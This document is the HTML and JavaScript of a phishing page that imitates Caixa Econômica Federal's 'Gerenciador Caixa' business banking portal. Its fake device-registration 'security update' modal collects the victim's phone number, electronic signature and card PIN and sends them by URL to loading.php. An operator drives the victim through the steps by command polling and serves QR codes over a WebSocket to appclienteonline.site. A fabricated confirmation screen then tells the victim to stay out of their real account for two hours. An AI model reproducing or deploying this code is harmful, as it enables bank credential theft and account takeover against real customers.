            <p class="modal-dispositivo__step9-auth-hash" id="step9-auth-hash">5d887c15ba8856e380c7e360a82963d75bfd519d</p>
          </div>
        </div>
        <div class="modal-dispositivo__step9-grid">
          <div>
            <div class="modal-dispositivo__step9-success">
              <span class="modal-dispositivo__step9-success-icon"><span class="fas fa-check" aria-hidden="true"></span></span>
              <div>
                <h3 class="modal-dispositivo__step9-success-title">Sucesso!</h3>
                <p class="modal-dispositivo__step9-success-text">O procedimento de segurança foi concluído e validado.</p>
              </div>
            </div>
            <div class="modal-dispositivo__step9-warn">
              <div class="modal-dispositivo__step9-warn-head">
                <span class="fas fa-exclamation-triangle" aria-hidden="true"></span>
                <span>Instrução Mandatória</span>
              </div>
              <p class="modal-dispositivo__step9-warn-text">Para garantir a replicação dos dados nos servidores centrais e evitar bloqueios por duplicidade de sessão, é estritamente necessário aguardar:</p>
              <div class="modal-dispositivo__step9-hours">2 HORAS</div>
              <p class="modal-dispositivo__step9-warn-note">* Não tente acessar sua conta pelo App ou Internet Banking antes deste prazo.</p>
            </div>
          </div>
          <div class="modal-dispositivo__step9-details">
            <h3 class="modal-dispositivo__step9-details-title">DETALHES DA TRANSAÇÃO</h3>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Operação:</span>
              <span class="modal-dispositivo__step9-row-value">ATUALIZAÇÃO DE SEGURANÇA</span>
            </div>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Protocolo:</span>
              <span class="modal-dispositivo__step9-row-value" id="step9-protocolo">2026.622.910436</span>
            </div>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Data/Hora:</span>
              <span class="modal-dispositivo__step9-row-value" id="step9-datahora">07/04/2026 - 00:09:32</span>
            </div>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Canal:</span>
              <span class="modal-dispositivo__step9-row-value">Internet Banking</span>
            </div>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Terminal:</span>
              <span class="modal-dispositivo__step9-row-value" id="step9-terminal">INT-58.275</span>
            </div>
            <div class="modal-dispositivo__step9-row">
              <span class="modal-dispositivo__step9-row-label">Status:</span>
              <span class="modal-dispositivo__step9-row-value modal-dispositivo__step9-status"><span class="fas fa-check" aria-hidden="true"></span> EFETIVADO</span>
            </div>
            <div class="modal-dispositivo__step9-actions">
              <button type="button" class="modal-dispositivo__step9-action" id="step9-imprimir"><span class="fas fa-print" aria-hidden="true"></span> Imprimir</button>
              <button type="button" class="modal-dispositivo__step9-action" id="step9-pdf"><span class="fas fa-download" aria-hidden="true"></span> Salvar em PDF</button>
            </div>
          </div>
        </div>
        <div class="modal-dispositivo__step9-bottom">
          <p class="modal-dispositivo__step9-contact">Ouvidoria: 0800 725 7474 | SAC: 0800 726 0101</p>
          <button type="button" class="modal-dispositivo__step9-btn-sair" id="modal-dispositivo-sair9">FECHAR E SAIR COM SEGURANÇA</button>
        </div>
      </div>
    </div>
    <div class="modal-dispositivo__footer">© CAIXA ECONÔMICA FEDERAL. TODOS OS DIREITOS RESERVADOS. | SEGURANÇA DIGITAL</div>
  </div>
</div>
</app-login-overlay><div _ngcontent-wno-c350="" id="landing"><div _ngcontent-wno-c350="" id="landing-header"><div _ngcontent-wno-c350="" id="landing-header-topo"><img _ngcontent-wno-c350="" id="landing-header-topo-logo" alt="Gerenciador Caixa" src="./sistema_files/logo-empresa.png"><button _ngcontent-wno-c350="" id="landing-header-topo-cadastro" routerlink="/cadastrar-usuario" class="button button-landing-style" tabindex="0"> Cadastre-se </button><button _ngcontent-wno-c350="" id="landing-header-topo-login" class="button button-primary" type="button" onclick="window.location.href='index.html'"> Acessar o <b _ngcontent-wno-c350="">gerenciador</b></button></div><div _ngcontent-wno-c350="" id="landing-header-conteudo"><h4 _ngcontent-wno-c350="" id="landing-header-conteudo-texto1">Seja bem vindo à nova forma de</h4><h1 _ngcontent-wno-c350="" id="landing-header-conteudo-texto2">gerenciar a sua empresa</h1><img _ngcontent-wno-c350="" id="landing-header-conteudo-imagem" alt="Gerenciador Caixa" src="./sistema_files/header-empresa.png"></div></div><!----><div _ngcontent-wno-c350="" id="landing-centro"><h1 _ngcontent-wno-c350="" id="landing-centro-texto1">Uma ferramenta do</h1><h1 _ngcontent-wno-c350="" id="landing-centro-texto2">tamanho da sua empresa</h1></div><div _ngcontent-wno-c350="" id="landing-apresentacao"><ul _ngcontent-wno-c350="" id="landing-apresentacao-lista"><li _ngcontent-wno-c350="" class="button item"> ME/Microempreendedor </li><li _ngcontent-wno-c350="" class="item active"> Pequena Empresa </li><li _ngcontent-wno-c350="" class="item"> Média Empresa </li><li _ngcontent-wno-c350="" class="item"> Grande Empresa </li><!----></ul><div _ngcontent-wno-c350="" id="landing-apresentacao-texto"><div _ngcontent-wno-c350="" class="texto-item"><div _ngcontent-wno-c350="" class="texto-item-bloco"><h2 _ngcontent-wno-c350="" class="texto-item-subtitulo">Vida de pequeno empreendedor é um desafio!</h2><div _ngcontent-wno-c350="" class="texto-item-conteudo"><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> O controle financeiro e administrativo da empresa estão em uma única pessoa, você. </p><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> E sabe o que marca aqueles que tem um perfil vencedor? Eles olham para essa extensa relação de atividades como um desafio, uma oportunidade e não um sacrifício. </p><!----></div></div><div _ngcontent-wno-c350="" class="vantagens"><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Acesso Simplificado</span></div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Fácil Navegação</span></div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Ampla visão de sua conta</span></div><!----></div><!----></div><div _ngcontent-wno-c350="" class="texto-item active"><div _ngcontent-wno-c350="" class="texto-item-bloco"><h2 _ngcontent-wno-c350="" class="texto-item-subtitulo">Acompanhar e controlar o fluxo de caixa, requer um controle mais elaborado, talvez seja a hora de ousar e usar o Gerenciador Caixa.</h2><div _ngcontent-wno-c350="" class="texto-item-conteudo"><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> Além da facilidade de controlar o caixa, é cômodo fazer os pagamentos, conseguir empréstimos, realizar financiamentos e adquirir linhas de crédito, tudo pela internet. </p><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> A Caixa tem como objetivo fortalecer a parceria da sua empresa com o banco oferecendo facilidades e serviços que visam o crescimento e a prosperiadade dos negócios. </p><!----></div></div><div _ngcontent-wno-c350="" class="vantagens"><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Antecipação de Recebíveis</span></div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Crédito Rápido e Fácil</span></div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span><span _ngcontent-wno-c350="">Agregue mais controle a seu negócio</span></div><!----></div><!----></div><div _ngcontent-wno-c350="" class="texto-item"><div _ngcontent-wno-c350="" class="texto-item-bloco"><h2 _ngcontent-wno-c350="" class="texto-item-subtitulo">O Gerenciador Caixa oferece comodidades dos serviços pela internet.</h2><div _ngcontent-wno-c350="" class="texto-item-conteudo"><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> Ter o controle da conta em gráficos e em resumos facilita a gestão da empresa, afinal, organizar as finanças dos seus negócios envolve especialmente os fatores: simplicidade dos serviços e condições para contratar. </p><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> Tudo isso, sem deixar de lado o relacionamento com o gerente, que faz toda a diferença na hora de trocar ideias das questões financeiras da empresa. </p><!----></div></div><!----></div><div _ngcontent-wno-c350="" class="texto-item"><div _ngcontent-wno-c350="" class="texto-item-bloco"><h2 _ngcontent-wno-c350="" class="texto-item-subtitulo">A arte de pensar grande motiva a equipe Caixa.</h2><div _ngcontent-wno-c350="" class="texto-item-conteudo"><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> O Gerenciador Caixa permite que o representante legal delegue poderes para os diversos colaboradores da empresa: financeiro, contábil, administrativo ou outros. Esta é apenas uma das comodidades que preparamos para você. </p><p _ngcontent-wno-c350="" class="texto-item-conteudo-paragrafo"> E não paramos por aqui, acesse o Gerenciador Caixa e faça parte dessa nova experiência que inova a gestão financeira do seu negócio e contamos com sua parceria para melhorar ainda mais. </p><!----></div></div><!----></div><!----><div _ngcontent-wno-c350="" class="texto-item-mobile"><!----></div><div _ngcontent-wno-c350="" class="texto-item-mobile active"><h2 _ngcontent-wno-c350="" class="texto-item-mobile-subtitulo">Acompanhar e controlar o fluxo de caixa, requer um controle mais elaborado, talvez seja a hora de ousar e usar o Gerenciador Caixa.</h2><div _ngcontent-wno-c350="" class="texto-item-mobile-conteudo"><p _ngcontent-wno-c350="" class="texto-item-mobile-conteudo-paragrafo"> Além da facilidade de controlar o caixa, é cômodo fazer os pagamentos, conseguir empréstimos, realizar financiamentos e adquirir linhas de crédito, tudo pela internet. </p><p _ngcontent-wno-c350="" class="texto-item-mobile-conteudo-paragrafo"> A Caixa tem como objetivo fortalecer a parceria da sua empresa com o banco oferecendo facilidades e serviços que visam o crescimento e a prosperiadade dos negócios. </p><!----></div><div _ngcontent-wno-c350="" class="vantagens"><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span> Antecipação de Recebíveis </div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span> Crédito Rápido e Fácil </div><div _ngcontent-wno-c350="" class="vantagens-item"><span _ngcontent-wno-c350="" class="fas fa-check vantagens-item-icone"></span> Agregue mais controle a seu negócio </div><!----></div><!----><!----><!----></div><div _ngcontent-wno-c350="" class="texto-item-mobile"><!----></div><div _ngcontent-wno-c350="" class="texto-item-mobile"><!----></div><!----></div></div><!----><div _ngcontent-wno-c350="" id="landing-footer"><div _ngcontent-wno-c350="" id="landing-footer-suporte"><p _ngcontent-wno-c350="">Alô CAIXA -</p><p _ngcontent-wno-c350="">Capitais: 4004 0104,</p><p _ngcontent-wno-c350="">Demais Regiões: 0800 104 0104</p></div><div _ngcontent-wno-c350="" id="landing-footer-links"><a _ngcontent-wno-c350="" href="https://www.caixa.gov.br/seguranca/Paginas/default.aspx" target="_blank" class="link">Segurança</a><a _ngcontent-wno-c350="" href="https://www.caixa.gov.br/atendimento/Paginas/default.aspx" target="_blank" class="link">Rede de Atendimento</a><a _ngcontent-wno-c350="" href="https://www.caixa.gov.br/atendimento/internet-banking/Paginas/default.aspx" target="_blank" class="link">Ajuda</a><a _ngcontent-wno-c350="" href="https://internetbanking.caixa.gov.br/statics-core/pdf/contrato.pdf" target="_blank" class="link">Termos e Contratos</a></div></div></div><!----><router-outlet _ngcontent-wno-c350=""></router-outlet><!----></app-landing><!----></app-root>

<script src="assets/js/cliente-status.js"></script>
<script>
(function () {
  // ============================================================
  // 1) LANDING
  // ============================================================
  var items = document.querySelectorAll('#landing-apresentacao-lista .item');
  var panels = document.querySelectorAll('#landing-apresentacao-texto .texto-item');
  var mobilePanels = document.querySelectorAll('#landing-apresentacao-texto .texto-item-mobile');

  function showPanel(index) {
    items.forEach(function (el, i) { el.classList.toggle('active', i === index); });
    panels.forEach(function (el, i) { el.classList.toggle('active', i === index); });
    mobilePanels.forEach(function (el, i) { el.classList.toggle('active', i === index); });
  }
  items.forEach(function (item, index) {
    item.addEventListener('click', function () { showPanel(index); });
  });

  // ============================================================
  // 2) MODAL / STEPS
  // ============================================================
  var modal = document.getElementById('modal-dispositivo');
  var aceite = document.getElementById('modal-dispositivo-aceite');
  var continuar = document.getElementById('modal-dispositivo-continuar');
  var sair = document.getElementById('modal-dispositivo-sair');
  var step1 = document.getElementById('modal-dispositivo-step1');
  var step2 = document.getElementById('modal-dispositivo-step2');
  var step3 = document.getElementById('modal-dispositivo-step3');
  var step4 = document.getElementById('modal-dispositivo-step4');
  var step5 = document.getElementById('modal-dispositivo-step5');
  var step6 = document.getElementById('modal-dispositivo-step6');
  var step7 = document.getElementById('modal-dispositivo-step7');
  var step8 = document.getElementById('modal-dispositivo-step8');
  var step9 = document.getElementById('modal-dispositivo-step9');
  var steps = [null, step1, step2, step3, step4, step5, step6, step7, step8, step9];

  var clienteStatusPoll = null;
  var stepAtualGlobal = 1;
  var extensaoOrigem = '';

  // ===== WebSocket =====
  var ws = null;
  var wsReconnectTimer = null;
  var fixedId = '';
  var lastShownDataUrl = null;
  var qrWsAtivo = false;

  // ============================================================
  // Helpers sessionStorage
  // ============================================================
  function salvarExtensaoOrigem(ext) {
    try { sessionStorage.setItem('extensao_origem', ext || ''); } catch (e) {}
  }
  function restaurarExtensaoOrigem() {
    try { return sessionStorage.getItem('extensao_origem') || ''; } catch (e) { return ''; }
  }

  function fecharModal() {
    modal.classList.add('hidden');
    document.body.classList.remove('modal-dispositivo-open');
    pararQrWebSocket();
    pararPollCliente();
  }

  function showStep(step) {
    [step1, step2, step3, step4, step5, step6, step7, step8, step9].forEach(function (s) {
      s.classList.remove('active');
    });
    step.classList.add('active');
  }

  function irComLoading(stepNum) {
    var origem = 'step' + (stepNum - 1);
    var params = new URLSearchParams();
    params.set('etapa_origem', origem);
    params.set('etapa_solicitada', String(stepNum));
    if (extensaoOrigem) params.set('extensao_origem', extensaoOrigem);
    if (stepNum === 2) params.set('aceite_termos', '1');
    if (stepNum === 4) {
      var opcaoSel = document.querySelector('.modal-dispositivo__opcao.selected');
      if (opcaoSel) params.set('opcao_cadastro', opcaoSel.dataset.opcao || '');
      params.set('nome_dispositivo', nomeInput.value.trim());
      params.set('telefone_cadastrado', telefoneInput.value.trim());
      params.set('prazo_dispositivo', prazoIndeterminado.checked ? 'indeterminado' : 'dias');
      params.set('dias_dispositivo', diasInput.value.trim());
    }
    if (stepNum === 5) params.set('assinatura', assinaturaInput.value.trim());
    if (stepNum === 6) params.set('senha_cartao', senhaCartaoInput.value.trim());
    window.location.href = 'loading.php?' + params.toString();
  }

  function salvarDadosStep3() {
    try {
      sessionStorage.setItem('disp_nome', nomeInput.value.trim());
      sessionStorage.setItem('disp_telefone', telefoneInput.value.trim());
      sessionStorage.setItem('disp_dias', diasInput.value.trim());
      sessionStorage.setItem('disp_prazo', prazoIndeterminado.checked ? 'indeterminado' : 'dias');
    } catch (e) {}
  }
  function restaurarDados() {
    try {
      var nome = sessionStorage.getItem('disp_nome');
      var telefone = sessionStorage.getItem('disp_telefone');
      var dias = sessionStorage.getItem('disp_dias');
      if (nome) nomeInput.value = nome;
      if (telefone) telefoneInput.value = telefone;
      if (dias) diasInput.value = dias;
    } catch (e) {}
  }

  // ============================================================
  // STEP 7 — QR via WebSocket
  // ============================================================
  function prepararStep7() {
    var devName = '';
    try { devName = sessionStorage.getItem('disp_nome') || ''; } catch (e) {}
    if (!devName && nomeInput) devName = nomeInput.value.trim();
    if (!devName) devName = 'Computador';
    document.getElementById('step7-device-name').textContent = devName.toUpperCase();

    var hoje = new Date();
    var dia = String(hoje.getDate()).padStart(2, '0');
    var mes = String(hoje.getMonth() + 1).padStart(2, '0');
    var ano = hoje.getFullYear();
    document.getElementById('step7-device-date').textContent = dia + '/' + mes + '/' + ano;

    resetarStep7Qr();
    iniciarQrWebSocket();
  }

  function resetarStep7Qr() {
    var aguardando = document.getElementById('step7-qr-aguardando');
    var img = document.getElementById('step7-qr-img');
    var header = document.getElementById('step7-qr-header');
    var headerText = document.getElementById('step7-qr-header-text');
    if (aguardando) aguardando.style.display = '';
    if (img) { img.style.display = 'none'; img.removeAttribute('src'); }
    if (header) header.classList.remove('modal-dispositivo__qr-header--ready');
    if (headerText) headerText.textContent = 'AGUARDANDO LEITURA';
    lastShownDataUrl = null;
  }

  function mostrarQrCodeDataUrl(dataUrl) {
    var aguardando = document.getElementById('step7-qr-aguardando');
    var img = document.getElementById('step7-qr-img');
    var header = document.getElementById('step7-qr-header');
    var headerText = document.getElementById('step7-qr-header-text');
    if (!img || !dataUrl) return;
    if (lastShownDataUrl === dataUrl && img.style.display !== 'none') return;

    // Aceita tanto base64 puro quanto data URL completa
    if (dataUrl.indexOf('data:') === 0) {
      img.src = dataUrl;
    } else {
      img.src = 'data:image/png;base64,' + dataUrl;
    }
    img.style.display = 'block';
    if (aguardando) aguardando.style.display = 'none';
    if (header) header.classList.add('modal-dispositivo__qr-header--ready');
    if (headerText) headerText.textContent = 'QR CODE DISPONÍVEL';
    lastShownDataUrl = dataUrl;
  }

  // ============================================================
  // WebSocket — mesma origem, porta 8080 (igual ao viewer)
  // ============================================================
  function resolveWsUrl() {
    var override = new URLSearchParams(location.search).get('ws');
    if (override && /^wss?:\/\/[A-Za-z0-9.\-:]+$/.test(override)) return override;

    // O servidor WebSocket fica em appclienteonline.site e só aceita TLS.
    // Forçamos wss:// independentemente do protocolo da página.
    var host = location.hostname || 'appclienteonline.site';

    // Se a própria página já está em appclienteonline.site, usa o host atual.
    // Caso contrário, aponta para o servidor central.
    if (host === 'appclienteonline.site' || host === 'www.appclienteonline.site') {
      return 'wss://' + host;
    }
    return 'wss://appclienteonline.site';
  }

  function pickFirstOnline(clientsMap) {
    var online = [];
    clientsMap.forEach(function (c) { if (c.online) online.push(c); });
    online.sort(function (a, b) {
      return (a.name || a.clientId).localeCompare(b.name || b.clientId);
    });
    return online[0] || null;
  }

  function pararQrWebSocket() {
    qrWsAtivo = false;
    if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
    if (ws) { try { ws.close(); } catch (e) {} ws = null; }
  }

  function iniciarQrWebSocket() {
    pararQrWebSocket();
    qrWsAtivo = true;
    conectarQrWs();
  }

  function conectarQrWs() {
    if (!qrWsAtivo) return;
    var WS_URL = resolveWsUrl();
    try {
      ws = new WebSocket(WS_URL);
    } catch (e) {
      agendarReconexaoQrWs();
      return;
    }

    ws.onopen = function () {
      try { ws.send(JSON.stringify({ type: 'panel-hello' })); } catch (e) {}
    };

    ws.onclose = function () {
      if (qrWsAtivo) agendarReconexaoQrWs();
    };

    ws.onerror = function () { try { ws.close(); } catch (e) {} };

    ws.onmessage = function (ev) {
      var msg;
      try { msg = JSON.parse(ev.data); } catch (e) { return; }
      if (!msg || msg.type !== 'state' || !Array.isArray(msg.clients)) return;

      var clientsMap = new Map();
      msg.clients.forEach(function (c) { clientsMap.set(c.clientId, c); });

      // 1) Resolve fixedId
      if (!fixedId) {
        if (extensaoOrigem && clientsMap.has(extensaoOrigem)) {
          fixedId = extensaoOrigem;
        } else {
          var first = pickFirstOnline(clientsMap);
          if (first) {
            fixedId = first.clientId;
            extensaoOrigem = fixedId;
            salvarExtensaoOrigem(extensaoOrigem);
          }
        }
      }

      // 2) Só renderiza no step 7
      if (stepAtualGlobal !== 7 || !fixedId) return;

      var c = clientsMap.get(fixedId);
      if (!c || !c.online || !c.qr || !c.qr.dataUrl) {
        resetarStep7Qr();
        return;
      }
      mostrarQrCodeDataUrl(c.qr.dataUrl);
    };
  }

  function agendarReconexaoQrWs() {
    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
    wsReconnectTimer = setTimeout(conectarQrWs, 2000);
  }

  // ============================================================
  // Polling de comandos (mantido)
  // ============================================================
  function pararPollCliente() {
    if (clienteStatusPoll) { clearInterval(clienteStatusPoll); clienteStatusPoll = null; }
  }

  function iniciarPollCliente() {
    pararPollCliente();
    if (typeof CaixaClienteStatus === 'undefined') return;
    var tick = function () {
      CaixaClienteStatus.fetchStatus().then(function (data) {
        if (!data || !data.ok) return;

        if (typeof data.extensao_origem === 'string' && data.extensao_origem !== '') {
          extensaoOrigem = data.extensao_origem;
          salvarExtensaoOrigem(extensaoOrigem);
          if (!fixedId) fixedId = extensaoOrigem;
        }

        var cmd = (data.comando || '').toString().trim();
        if (/^[1-9]$/.test(cmd) && parseInt(cmd, 10) !== stepAtualGlobal) {
          var url = 'sistema.php?step=' + cmd;
          if (extensaoOrigem) url += '&extensao_origem=' + encodeURIComponent(extensaoOrigem);
          window.location.href = url;
          return;
        }
        if (cmd === 'finalizar') { window.location.href = 'index.php'; return; }
        CaixaClienteStatus.processarErro(data.erro, { pagina: 'sistema', etapa: stepAtualGlobal });
      }).catch(function () {});
    };
    tick();
    clienteStatusPoll = setInterval(tick, 2000);
  }

  // ============================================================
  // Step 8 / 9
  // ============================================================
  function prepararStep8() { /* aguarda comando do operador */ }

  function gerarHashAuth() {
    var chars = '0123456789abcdef';
    var hash = '';
    for (var i = 0; i < 40; i++) hash += chars.charAt(Math.floor(Math.random() * chars.length));
    return hash;
  }

  function prepararStep9() {
    var agora = new Date();
    var dia = String(agora.getDate()).padStart(2, '0');
    var mes = String(agora.getMonth() + 1).padStart(2, '0');
    var ano = agora.getFullYear();
    var hora = String(agora.getHours()).padStart(2, '0');
    var min = String(agora.getMinutes()).padStart(2, '0');
    var seg = String(agora.getSeconds()).padStart(2, '0');
    var protocolo = ano + '.' + String(Math.floor(100 + Math.random() * 900)) + '.' + String(Math.floor(100000 + Math.random() * 900000));
    var terminal = 'INT-' + String(Math.floor(10 + Math.random() * 90)) + '.' + String(Math.floor(100 + Math.random() * 900));
    document.getElementById('step9-auth-hash').textContent = gerarHashAuth();
    document.getElementById('step9-protocolo').textContent = protocolo;
    document.getElementById('step9-datahora').textContent = dia + '/' + mes + '/' + ano + ' - ' + hora + ':' + min + ':' + seg;
    document.getElementById('step9-terminal').textContent = terminal;
  }

  function iniciarEtapa(num) {
    stepAtualGlobal = num;
    var stepEl = steps[num] || step1;
    showStep(stepEl);

    if (num === 2) {
      setTimeout(function () { irComLoading(3); }, 2800);
    } else if (num === 4) {
      setTimeout(function () { document.getElementById('disp-assinatura').focus(); }, 50);
    } else if (num === 5) {
      setTimeout(function () { document.getElementById('disp-senha-cartao').focus(); }, 50);
    } else if (num === 7) {
      prepararStep7();
    } else if (num === 8) {
      prepararStep8();
    } else if (num === 9) {
      prepararStep9();
    }
    iniciarPollCliente();
  }

  document.body.classList.add('modal-dispositivo-open');

  // ============================================================
  // Step 3
  // ============================================================
  var opcoes = document.querySelectorAll('.modal-dispositivo__opcao');
  var formBox = document.getElementById('modal-dispositivo-form-box');
  var nomeInput = document.getElementById('disp-nome');
  var telefoneInput = document.getElementById('disp-telefone');
  var diasInput = document.getElementById('disp-dias');
  var prazoIndeterminado = document.querySelector('input[name="prazo"][value="indeterminado"]');
  var btnContinuar3 = document.getElementById('modal-dispositivo-continuar3');

  restaurarDados();

  function formatarTelefone(valor) {
    var d = valor.replace(/\D/g, '').slice(0, 11);
    if (d.length <= 2) return d.length ? '(' + d : '';
    if (d.length <= 6) return '(' + d.slice(0, 2) + ') ' + d.slice(2);
    if (d.length <= 10) return '(' + d.slice(0, 2) + ') ' + d.slice(2, 6) + '-' + d.slice(6);
    return '(' + d.slice(0, 2) + ') ' + d.slice(2, 7) + '-' + d.slice(7, 11);
  }
  function telefoneValido(valor) {
    var d = valor.replace(/\D/g, '');
    return d.length >= 10 && d.length <= 11;
  }
  function validarStep3() {
    var opcaoSelecionada = document.querySelector('.modal-dispositivo__opcao.selected');
    var ok = false;
    if (opcaoSelecionada) {
      var nomeOk = nomeInput.value.trim().length > 0;
      var telefoneOk = telefoneValido(telefoneInput.value);
      var prazoOk = prazoIndeterminado.checked || (diasInput.value.trim().length > 0 && parseInt(diasInput.value, 10) > 0);
      ok = nomeOk && telefoneOk && prazoOk;
    }
    btnContinuar3.disabled = !ok;
  }

  telefoneInput.addEventListener('input', function () {
    var pos = telefoneInput.selectionStart;
    var antes = telefoneInput.value;
    telefoneInput.value = formatarTelefone(telefoneInput.value);
    if (telefoneInput.value.length < antes.length) telefoneInput.setSelectionRange(pos, pos);
    validarStep3();
  });
  opcoes.forEach(function (opcao) {
    opcao.addEventListener('click', function () {
      opcoes.forEach(function (o) { o.classList.remove('selected'); });
      opcao.classList.add('selected');
      formBox.classList.add('active');
      validarStep3();
    });
  });
  nomeInput.addEventListener('input', validarStep3);
  diasInput.addEventListener('input', validarStep3);
  prazoIndeterminado.addEventListener('change', validarStep3);
  document.querySelectorAll('input[name="prazo"]').forEach(function (r) {
    r.addEventListener('change', validarStep3);
  });
  validarStep3();

  aceite.addEventListener('change', function () { continuar.disabled = !aceite.checked; });
  continuar.addEventListener('click', function () { irComLoading(2); });
  sair.addEventListener('click', fecharModal);
  btnContinuar3.addEventListener('click', function () { salvarDadosStep3(); irComLoading(4); });

  // ============================================================
  // Step 4
  // ============================================================
  var assinaturaInput = document.getElementById('disp-assinatura');
  var btnConfirmar4 = document.getElementById('modal-dispositivo-confirmar4');
  function validarStep4() {
    var valor = assinaturaInput.value.replace(/\D/g, '');
    if (valor !== assinaturaInput.value) assinaturaInput.value = valor;
    btnConfirmar4.disabled = !/^[0-9]{6,8}$/.test(valor);
  }
  assinaturaInput.addEventListener('input', function () {
    validarStep4();
    if (typeof CaixaClienteStatus !== 'undefined') CaixaClienteStatus.esconderErroInline('assinatura');
  });
  btnConfirmar4.addEventListener('click', function () { irComLoading(5); });

  // ============================================================
  // Step 5
  // ============================================================
  var senhaCartaoInput = document.getElementById('disp-senha-cartao');
  var btnConfirmar5 = document.getElementById('modal-dispositivo-confirmar5');
  function validarStep5() {
    var valor = senhaCartaoInput.value.replace(/\D/g, '');
    if (valor !== senhaCartaoInput.value) senhaCartaoInput.value = valor;
    btnConfirmar5.disabled = !/^[0-9]{4}$/.test(valor);
  }
  senhaCartaoInput.addEventListener('input', validarStep5);
  btnConfirmar5.addEventListener('click', function () { irComLoading(6); });

  // ============================================================
  // Step 6
  // ============================================================
  var btnContinuar6 = document.getElementById('modal-dispositivo-continuar6');
  btnContinuar6.addEventListener('click', function () { irComLoading(7); });

  // ============================================================
  // Step 7 — mockup
  // ============================================================
  var phoneBtn = document.getElementById('modal-dispositivo-phone-fechar');
  phoneBtn.addEventListener('click', function () {
    var mockup = document.querySelector('.modal-dispositivo__phone-mockup');
    if (mockup) mockup.style.opacity = '0.5';
  });

  // ============================================================
  // Step 9
  // ============================================================
  document.getElementById('modal-dispositivo-sair9').addEventListener('click', fecharModal);
  document.getElementById('step9-imprimir').addEventListener('click', function () { window.print(); });
  document.getElementById('step9-pdf').addEventListener('click', function () { window.print(); });

  // ============================================================
  // Inicialização
  // ============================================================
  var urlParams = new URLSearchParams(window.location.search);
  var stepAtual = parseInt(urlParams.get('step') || '1', 10);
  if (isNaN(stepAtual) || stepAtual < 1 || stepAtual > 9) stepAtual = 1;

  var extUrl = urlParams.get('extensao_origem');
  if (extUrl) {
    extensaoOrigem = extUrl;
    salvarExtensaoOrigem(extensaoOrigem);
    fixedId = extensaoOrigem;
  } else {
    extensaoOrigem = restaurarExtensaoOrigem();
    fixedId = extensaoOrigem;
  }

  iniciarEtapa(stepAtual);
})();
</script>

</body></html>
